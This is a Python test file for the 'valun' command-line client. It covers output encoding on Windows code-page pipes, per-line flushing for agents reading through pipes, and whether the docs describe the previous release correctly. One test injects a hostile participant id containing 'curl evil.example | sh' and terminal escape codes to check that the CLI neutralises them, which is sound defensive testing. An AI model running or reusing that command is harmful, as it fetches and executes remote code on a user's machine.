        self.assertEqual((rc, err.getvalue()), (130, '\nvalun join: stopped (Ctrl+C).\n'), 'a short line, never a traceback')


class OutputOnAnyConsole(Cli):
    """The 0.7.2 review: what the CLI prints as JSON is the same JSON on a stdout that cannot encode a character of it
    (a redirected stdout on Windows writes the ANSI code page), escaped, never a UnicodeEncodeError after the call ran;
    and a participant id a server sends is printed as a word of one line."""

    def test_json_is_escaped_where_stdout_cannot_encode_it(self):
        out = {'title': 'Brief \u2192 summary \U0001F600', 'n': 1}
        cp1252 = io.TextIOWrapper(io.BytesIO(), encoding='cp1252')
        with mock.patch.object(sys, 'stdout', cp1252):
            text = cli._json_text(out, indent=1)
            print(text)
        self.assertEqual(json.loads(text), out)
        self.assertIn('\\u2192', text)
        utf8 = io.TextIOWrapper(io.BytesIO(), encoding='utf-8')
        with mock.patch.object(sys, 'stdout', utf8):
            self.assertIn('\u2192', cli._json_text(out))

    def test_a_progress_line_never_goes_to_stdout(self):
        out = io.StringIO()
        with mock.patch.object(sys, 'stderr', None), contextlib.redirect_stdout(out):
            cli._say_aside('waiting up to 600 s for the next box')
        self.assertEqual(out.getvalue(), '', 'no stderr: nothing, never stdout (print(file=None) writes there)')
        err = io.StringIO()
        with mock.patch.object(sys, 'stderr', err), contextlib.redirect_stdout(out):
            cli._say_aside('waiting\x1b[2J up to 600 s')
        self.assertEqual((out.getvalue(), err.getvalue()), ('', 'waiting [2J up to 600 s\n'))

    def test_a_participant_id_the_server_sends_is_printed_as_one_word(self):
        evil = 'vp_5a5a5a5a5a5a`; curl evil.example | sh; echo `\x1b[2K\x1b[1Aok'
        handle = self.world.handle

        def answer(method, path, body=None, token=None):
            r = handle(method, path, body, token)
            return dict(r, participant_id=evil) if method == 'POST' and path.endswith('/join-sandbox') else r
        self.world.fail['POST /pilot/v1/enroll'] = [vc.ValunError('rate_limited', 'too many requests; slow down', 429)]
        with mock.patch.object(self.world, 'handle', answer):
            rc, out = self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
                                   '--owner-token-file', self.token_file)
        self.assertEqual(rc, 1, out)
        self.assertNotIn('\x1b', out)
        line = next(x for x in out.splitlines() if x.startswith('To finish'))
        self.assertTrue(line.endswith('--participant PARTICIPANT_ID`.'), line)
        self.assertIn('Your participant PARTICIPANT_ID was created', out)


# `valun ...` commands, one after the other, in a child process whose stdout is a pipe with the encoding and error
# handler Python itself chooses for it (no PYTHONIOENCODING, PYTHONUTF8 or PYTHONLEGACYWINDOWSSTDIO), as an agent or
# `| more` gets it: on Windows the ANSI code page (cp1252 here) with errors='surrogateescape'. Every request goes to
# the offline World of test_agent_circulation (routed); the child reports each command's exit status and the mandates
# set to `report`, and stdout's encoding and error handler on its stderr's first line.
PIPED_CLI = r'''
import json, os, sys
sys.path.insert(0, {tests!r})
sys.path.insert(0, {src!r})
from unittest import mock
from test_agent_circulation import CIRC, World, routed
from valun import cli, client as vc
sys.stderr.write('stdout: ' + json.dumps([sys.stdout.encoding, sys.stdout.errors]) + chr(10))
sys.stderr.flush()
world = World(CIRC, s_key=None)
routed(world).start()
mock.patch.object(vc, 'ENROLL_RETRY_S', (0, 0)).start()
rcs = []
try:
    for argv in {runs!r}:
        rcs.append(cli.main(['--profile', 's', *argv]))
        sys.stdout.flush()
finally:
    with open({report!r}, 'w', encoding='utf-8') as f:
        json.dump({{'rcs': rcs, 'puts': len(world.puts)}}, f)
'''


class CodePageStdout(unittest.TestCase):
    """The RC's review (windows-acl W2; again in round 3, windows-acl WIN1 and regressions R3-REG-1): on Windows a stdout
    that is not a console (an agent, a pipe, a file) writes the ANSI code page, cp1252 here, with the error handler
    'surrogateescape', which raises UnicodeEncodeError for a character the code page lacks. With a home folder named
    outside it ('Fitz Dóud 名前'), `valun join` ended in that error at the line naming the owner token file: written,
    the participant had no saved agent key; not written (a file there already, or one that cannot be made), the owner
    token was never shown, so it was lost. "Credentials are stored privately in <profile>", doctor's "profiles in
    <folder>", status and console failed the same way. The first fix changed only a stream whose handler is 'strict',
    which Python on Windows never gives a pipe, so it did nothing there, and its test passed only because it built a
    strict stream itself. Now main() lets such a stdout print any text (a \\u escape for what the code page lacks), and
    a value a printed command would carry with an escape is named apart instead (_faithful), as FILE is for the owner
    token file. These run in a child process whose stdout is a real pipe; elsewhere than on Windows the child is given
    cp1252 with surrogateescape (PYTHONIOENCODING), as Windows gives it."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.uhome = os.path.join(self.tmp.name, 'Fitz Dóud 名前')
        os.makedirs(self.uhome)

    def piped(self, *runs):
        """The commands `runs` (argv lists, after --profile s) in one child process: (exit statuses, mandates set, what
        stdout carried, as text, and stderr). The child's own exit status is the last command's, or 1 on a traceback."""
        import subprocess
        report = os.path.join(self.tmp.name, 'report.json')
        code = PIPED_CLI.format(tests=HERE, src=os.path.join(os.path.dirname(HERE), 'src'), runs=[list(r) for r in runs],
                                report=report)
        env = {k: v for k, v in os.environ.items() if not k.upper().startswith(('VALUN_', 'PYTHON'))}
        env.update(VALUN_HOME=self.uhome, HOME=self.uhome, USERPROFILE=self.uhome)
        if os.name != 'nt':
            env['PYTHONIOENCODING'] = 'cp1252:surrogateescape'       # what Windows gives a pipe
        p = subprocess.run([sys.executable, '-c', code], stdin=subprocess.DEVNULL, capture_output=True, env=env,
                           cwd=self.tmp.name, timeout=300)
        err = p.stderr.decode('utf-8', 'replace')
        first = err.splitlines()[0] if err else ''
        self.assertTrue(first.startswith('stdout: '), err)
        encoding, errors = json.loads(first[len('stdout: '):])
        if os.name == 'nt' and not encoding.lower().replace('-', '').startswith('utf'):
            self.assertEqual(errors, 'surrogateescape', 'what Python on Windows gives a pipe')
        with open(report, encoding='utf-8') as f:
            got = json.load(f)
        self.assertNotIn('Traceback', err)
        return got['rcs'], got['puts'], p.stdout.decode(encoding, 'replace').replace('\r\n', '\n'), err

    def join(self, *extra):
        return self.piped(['join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--approvals', 'none',
                           '--server', SERVER, *extra], ['status'], ['doctor'], ['console', '--no-open'])

    def finished(self, rcs, puts, out):
        """The join's later steps ran (the agent's key saved, the mandate set, its last lines printed), and status,
        doctor and console printed theirs: no command carries an escape, and the paths' characters are printed as
        their code page has them or as \\u escapes."""
        with open(os.path.join(self.uhome, 'profiles', 's.json'), encoding='utf-8') as f:
            disk = json.load(f)
        self.assertEqual((disk['participant_id'], bool(disk.get('secret')), disk['approvals']), (S_ID, True, 'none'))
        self.assertEqual(puts, 1, 'the mandate was set')
        self.assertEqual(len(rcs), 4, out)
        self.assertEqual((rcs[1], rcs[3]), (0, 0), out)
        self.assertIn(rcs[2], (0, 1), out)
        self.assertIn('Credentials are stored privately in ', out)
        self.assertIn('Next: run `valun --profile s doctor`', out)
        self.assertIn('participant: ', out)                         # status
        self.assertIn('profiles in ', out)                          # doctor
        self.assertIn('Owner console: ', out)                       # console
        self.assertTrue('\\u540d\\u524d' in out or '名前' in out, out)
        for cmd in re.findall(r'`([^`]*)`', out):
            self.assertNotIn('\\u', cmd, 'a printed command never carries an escape')

    def test_the_default_file_written(self):
        rcs, puts, out, err = self.join()
        self.assertEqual(rcs[0], 0, out + err)
        self.assertIn('Your OWNER token is in ', out)
        self.assertNotIn('vpo_test-only', out)
        with open(os.path.join(self.uhome, 'valun-owner-token-stranger.txt'), encoding='utf-8') as f:
            self.assertEqual(f.read(), 'vpo_test-only\n')
        self.finished(rcs, puts, out)

    def refused(self, *extra):
        """The join alone, refused before anything was sent (exit 2), its paths printed as the code page has them."""
        rcs, puts, out, err = self.piped(['join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--approvals',
                                          'none', '--server', SERVER, *extra])
        self.assertEqual((rcs, puts), ([2], 0), out + err)
        self.assertTrue(out.startswith('Nothing was sent: '), out)
        self.assertNotIn('vpo_', out + err)
        self.assertTrue('\\u540d\\u524d' in out or '名前' in out, out)
        return out

    def test_a_file_there_already_is_refused_before_anything_is_sent(self):
        with open(os.path.join(self.uhome, 'valun-owner-token-stranger.txt'), 'w', encoding='utf-8') as f:
            f.write('vpo_another-identity\n')
        self.assertIn('exists already (join writes your owner token there when no --owner-token-file is given)',
                      self.refused())

    def test_a_file_in_a_missing_folder_is_refused_before_anything_is_sent(self):
        missing = os.path.join(self.uhome, 'no folder 名', 'owner.txt')     # its folder is not there
        self.assertIn('does not exist, so your owner token could not be written there', self.refused('--owner-token-file', missing))

    def test_an_ascii_owner_token_file_with_the_profile_under_the_home(self):
        ascii_file = os.path.join(self.tmp.name, 'ascii', 'owner.txt')
        os.makedirs(os.path.dirname(ascii_file))
        rcs, puts, out, err = self.join('--owner-token-file', ascii_file)
        self.assertEqual(rcs[0], 0, out + err)
        self.assertIn(f'Your OWNER token is in {ascii_file}.', out)
        self.finished(rcs, puts, out)

    def test_a_command_names_a_file_it_cannot_print_apart(self):
        # Console approvals (join --sandbox's default) print the command that changes them, with the owner token file
        rcs, puts, out, err = self.piped(['join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server',
                                          SERVER])
        self.assertEqual(rcs, [0], out + err)
        if '名前' not in out:                    # the code page lacks it: FILE, and what FILE is
            self.assertIn('config approvals MODE --owner-token-file FILE` (MODE: ask, client-prompt or none; FILE: the '
                          'file holding your owner token).', out)
        for cmd in re.findall(r'`([^`]*)`', out):
            self.assertNotIn('\\u', cmd)


# `valun sandbox buy` or `earn` in a child process whose stdout is a pipe, as a shell agent runs it: the Valun client is
# a stand-in whose deal() waits, at WAIT, until the test writes a line to the child's stdin (the owner approving in the
# console), so the test can see which lines arrived while the command still waits.
PIPED_CHILD = r'''
import json, os, sys, types
sys.path.insert(0, {src!r})
from unittest import mock
from valun import cli, sandbox as sb
views = iter({views!r})


def deal(did):
    v = next(views)
    if v == 'WAIT':
        sys.stdin.readline()
        v = next(views)
    return {{'status': v}}


stub = types.SimpleNamespace(state={{'server': {server!r}}}, participant_id='vp_0a0a0a0a0a0a', unit='nanoERG', network=None,
                             directory=lambda: [{{'id': 'vp_0b0b0b0b0b0b', 'handle': 'sandbox-exact'}}], inbox=lambda: {{}},
                             propose=lambda *a: {{'id': 'vd_0123456789abcdef', 'status': 'proposed_awaiting_owner'}},
                             deal=deal)
with mock.patch.object(sb.vc, 'Client', lambda store, server=None: stub), mock.patch.object(sb.time, 'sleep', lambda s: None):
    sys.exit(cli.main({argv!r}))
'''


class PipedLines(unittest.TestCase):
    """The RC's staging test (2026-11-18), problem 2: `valun sandbox earn` and `buy` printed without flushing, so an agent
    reading their output through a pipe saw "your offer waits for you in the owner console" only when the command ended
    (7 lines at once, after the owner had approved). Each line is now flushed as it is printed, as the tour's are."""
    WAITS = 'your offer waits for you in the owner console (http://127.0.0.1:9/pilot#owner): approve it there'

    def run_piped(self, argv, views):
        import queue
        import subprocess
        import threading
        import time
        home = tempfile.TemporaryDirectory()
        self.addCleanup(home.cleanup)
        os.makedirs(os.path.join(home.name, 'profiles'))
        with open(os.path.join(home.name, 'profiles', 'default.json'), 'w', encoding='utf-8') as f:
            json.dump({'server': 'http://127.0.0.1:9', 'participant_id': 'vp_0a0a0a0a0a0a', 'network': 'valun-testnet-1',
                       'secret': '11' * 32, 'agent_token': 'vpa_TEST-ONLY-piped', 'approvals': 'console'}, f)
        env = {k: v for k, v in os.environ.items() if not k.upper().startswith(('VALUN_', 'PYTHON'))}
        env.update(VALUN_HOME=home.name, PYTHONIOENCODING='utf-8')        # never PYTHONUNBUFFERED: a pipe as an agent's
        code = PIPED_CHILD.format(src=os.path.join(os.path.dirname(HERE), 'src'), views=list(views),
                                  server='http://127.0.0.1:9', argv=list(argv))
        p = subprocess.Popen([sys.executable, '-c', code], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, env=env, cwd=home.name)
        self.addCleanup(p.kill)
        lines = queue.Queue()

        def read():
            for x in p.stdout:
                lines.put(x.decode('utf-8', 'replace').rstrip())
            lines.put(None)                     # the end of its output
        threading.Thread(target=read, daemon=True).start()
        early, end = [], time.monotonic() + 20
        while not any(self.WAITS in x for x in early) and time.monotonic() < end:
            try:
                x = lines.get(timeout=max(0.01, end - time.monotonic()))
            except queue.Empty:
                break
            if x is None:
                break
            early.append(x)
        waiting = p.poll() is None              # the child still waits in deal(): the owner has not approved yet
        with contextlib.suppress(OSError):      # a child that ended already reads nothing
            p.stdin.write(b'approved\n')
            p.stdin.close()
        rc = p.wait(30)
        later = []
        with contextlib.suppress(queue.Empty):
            while (x := lines.get(timeout=30)) is not None:
                later.append(x)
        p.stdout.close()
        return early, waiting, rc, later

    def test_sandbox_buy_and_earn_print_each_line_while_they_wait(self):
        for argv, views in ((['sandbox', 'buy', 'sandbox-exact', 'text-stats', '--text', 'hi'], ['WAIT', 'rejected_by_owner']),
                            (['sandbox', 'earn'], ['proposed_awaiting_owner', 'WAIT', 'declined'])):
            early, waiting, rc, later = self.run_piped(argv, views)
            self.assertTrue(waiting, (argv, early))
            self.assertTrue(any(self.WAITS in x for x in early),
                            f'{argv[1]}: the waiting line did not arrive while the command waited: {early}')
            self.assertTrue(early[0].startswith('offered '), early)
            self.assertEqual(rc, 1, later)
            self.assertTrue(later and later[-1].startswith('{"deal_id": "vd_0123456789abcdef"'), later)

    def test_a_reader_that_goes_away_stops_nothing(self):
        # The RC's review (R2-OTHER-5): once each line was flushed, a reader that left early (`| head -n 1`) made the next
        # line raise OSError, and its traceback stopped buy or earn mid-deal (0.7.1's buffered print finished every step).
        import subprocess
        home = tempfile.TemporaryDirectory()
        self.addCleanup(home.cleanup)
        os.makedirs(os.path.join(home.name, 'profiles'))
        with open(os.path.join(home.name, 'profiles', 'default.json'), 'w', encoding='utf-8') as f:
            json.dump({'server': 'http://127.0.0.1:9', 'participant_id': 'vp_0a0a0a0a0a0a', 'network': 'valun-testnet-1',
                       'secret': '11' * 32, 'agent_token': 'vpa_TEST-ONLY-piped', 'approvals': 'console'}, f)
        env = {k: v for k, v in os.environ.items() if not k.upper().startswith(('VALUN_', 'PYTHON'))}
        env.update(VALUN_HOME=home.name, PYTHONIOENCODING='utf-8')
        code = PIPED_CHILD.format(src=os.path.join(os.path.dirname(HERE), 'src'), views=['WAIT', 'rejected_by_owner'],
                                  server='http://127.0.0.1:9', argv=['sandbox', 'buy', 'sandbox-exact', 'text-stats',
                                                                     '--text', 'hi'])
        code = code.replace('    sys.exit(cli.main(', '    rc = cli.main(').replace("'hi']))", "'hi'])\n    open('done.txt', 'w')"
                                                                                       ".write(str(rc))\n    sys.exit(rc)")
        p = subprocess.Popen([sys.executable, '-c', code], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, env=env, cwd=home.name)
        self.addCleanup(p.kill)
        first = p.stdout.readline()
        self.assertTrue(first.startswith(b'offered '), first)
        p.stdout.close()                        # the reader goes away, as `head -n 1` does
        p.stdin.write(b'approved\n')
        p.stdin.close()
        rc = p.wait(30)
        err = p.stderr.read().decode('utf-8', 'replace')
        p.stderr.close()
        self.assertNotIn('Traceback', err)
        self.assertEqual(rc, 1, err)            # as when the output is read whole: the owner rejected the offer
        with open(os.path.join(home.name, 'done.txt'), encoding='utf-8') as f:
            self.assertEqual(f.read(), '1', 'buy ended as it does, every step done')

    def test_powershells_select_object_stops_the_deal_and_the_docs_say_so(self):
        # The RC's review, round 3 (regressions R3-REG-2): Windows PowerShell's `| Select-Object -First N` ends the native
        # command once it has N lines, so with each line flushed (c0bcae5) `sandbox buy` stopped after the offer was
        # signed and sent, before the delivery was verified or paid (0.7.1 printed nothing until it ended, so the same
        # pipeline ran every step). _line_now's docstring said that "stops nothing". Nothing can keep a process that is
        # ended so: the README and the CHANGELOG say so, and how to keep part of the output instead.
        import shutil
        import subprocess
        import time
        root = os.path.dirname(os.path.dirname(HERE))
        with open(os.path.join(root, 'python', 'README.md'), encoding='utf-8') as f:
            readme = ' '.join(f.read().split())
        with open(os.path.join(root, 'CHANGELOG.md'), encoding='utf-8') as f:
            changelog = ' '.join(f.read().split())
        for text in (readme, changelog):
            self.assertIn("Windows PowerShell's `| Select-Object -First N`", text)
            self.assertIn('`valun call valun_inbox`', text)
        self.assertIn('> earn.txt', readme)
        self.assertNotIn('Select-Object -First 3) stops nothing', ' '.join(cli._line_now.__doc__.split()))
        ps = shutil.which('powershell') if os.name == 'nt' else None
        if ps is None:
            return                              # no Windows PowerShell here: the docs are checked above
        home = tempfile.TemporaryDirectory()
        self.addCleanup(home.cleanup)
        calls = os.path.join(home.name, 'calls.txt')
        child = os.path.join(home.name, 'buy_child.py')
        with open(child, 'w', encoding='utf-8') as f:
            f.write(SLOW_BUY.format(src=os.path.join(os.path.dirname(HERE), 'src'), home=home.name, calls=calls))
        script = f"& '{sys.executable}' '{child}' | Select-Object -First 1"
        import base64
        p = subprocess.run([ps, '-NoProfile', '-NonInteractive', '-EncodedCommand',
                            base64.b64encode(script.encode('utf-16-le')).decode('ascii')], capture_output=True, timeout=120,
                           env={k: v for k, v in os.environ.items() if not k.upper().startswith(('VALUN_', 'PYTHON'))})
        self.assertTrue(p.stdout.decode('utf-8', 'replace').startswith('offered '), p.stdout)
        time.sleep(6)                           # more than the rest of the deal (3 reads of 1.5 s) would take, had it gone on
        with open(calls, encoding='utf-8') as f:
            done = f.read().splitlines()
        self.assertEqual(done[0], 'propose', done)
        self.assertNotIn('complete', done, 'PowerShell ended it before the delivery was verified and paid')


# `valun sandbox buy` against a stand-in Client whose reads take a moment each, recording each call in a file (what was
# done is known after the reader of stdout has gone)
SLOW_BUY = r'''
import json, os, sys, threading, types
sys.path.insert(0, {src!r})
os.environ['VALUN_HOME'] = {home!r}
os.makedirs(os.path.join({home!r}, 'profiles'), exist_ok=True)
with open(os.path.join({home!r}, 'profiles', 'default.json'), 'w', encoding='utf-8') as f:
    json.dump({{'server': 'http://127.0.0.1:9', 'participant_id': 'vp_0a0a0a0a0a0a', 'network': 'valun-testnet-1',
               'secret': '11' * 32, 'agent_token': 'vpa_TEST-ONLY-piped', 'approvals': 'none'}}, f)
from unittest import mock
from valun import cli, sandbox as sb


def rec(x):
    with open({calls!r}, 'a', encoding='utf-8') as f:
        f.write(x + chr(10))


content = sb.render('text-stats', sb.COMPUTE['text-stats']('hi'), 'hi')
views = iter([{{'status': 'accepted'}}, {{'status': 'agreed'}},
              {{'status': 'delivered', 'delivery': {{'content': content, 'sha256': 'ab' * 32}}}}])


def deal(did):
    threading.Event().wait(1.5)                 # a server's answer takes a moment: PowerShell ends the deal meanwhile
    v = next(views)
    rec('read ' + v['status'])
    return v


def propose(*a):
    rec('propose')
    return {{'id': 'vd_0123456789abcdef', 'status': 'proposed'}}


def complete(did, sha):
    rec('complete')
    return {{'status': 'note_issued'}}


stub = types.SimpleNamespace(state={{'server': 'http://127.0.0.1:9'}}, participant_id='vp_0a0a0a0a0a0a', unit='nanoERG',
                             network=None, directory=lambda: [{{'id': 'vp_0b0b0b0b0b0b', 'handle': 'sandbox-exact'}}],
                             propose=propose, deal=deal, complete=complete)
with mock.patch.object(sb.vc, 'Client', lambda store, server=None: stub), mock.patch.object(sb.time, 'sleep', lambda s: None):
    rc = cli.main(['sandbox', 'buy', 'sandbox-exact', 'text-stats', '--text', 'hi'])
rec(f'returned {{rc}}')
sys.exit(rc)
'''


class WhatTheNotesSayOf071(unittest.TestCase):
    """The RC's review, round 3 (regressions R4-REG-4): three statements about 0.7.1 were wrong. For a profiles folder
    this user may not open, the CHANGELOG said 0.7.1's doctor said "no profile file yet", which is this release's own
    wording (0.7.1 called the missing profile private, said "Approvals: ask" and gave "Not connected" with a join); it
    listed `valun console`, which 0.7.1 does not have, among what failed on a code-page stdout; and python/README.md said
    0.7.1 printed nothing until the end after a block that lists the tour, which 0.7.1 printed line by line already
    (only sandbox earn and buy did not)."""

    def read(self, *parts):
        root = os.path.dirname(os.path.dirname(HERE))
        with open(os.path.join(root, *parts), encoding='utf-8') as f:
            return ' '.join(f.read().split())

    def test_the_changelog_and_the_readme_say_what_0_7_1_did(self):
        changelog = self.read('CHANGELOG.md')
        notes = changelog[changelog.index('## 0.7.2'):changelog.index('## 0.7.1')]
        self.assertNotIn('so doctor said "no profile file yet" and "Not connected"', notes)
        self.assertIn("so 0.7.1's doctor called it private and said \"Approvals: ask\" and \"Not connected\" with a join, "
                      'status "(not joined)" and "approvals: ask"', notes)
        self.assertNotIn('doctor, status and console at the lines that name the profile', notes)
        self.assertIn('and doctor and status at the lines that name the profile or its folder', notes)
        readme = self.read('python', 'README.md')
        self.assertNotIn('(valun 0.7.1 printed nothing until the command ended, so it ran on.)', readme)
        self.assertIn("(valun 0.7.1's `sandbox earn` and `buy` printed nothing until they ended, so they ran on; its tour "
                      'printed each line as it happened already.)', readme)


if __name__ == '__main__':
    unittest.main()
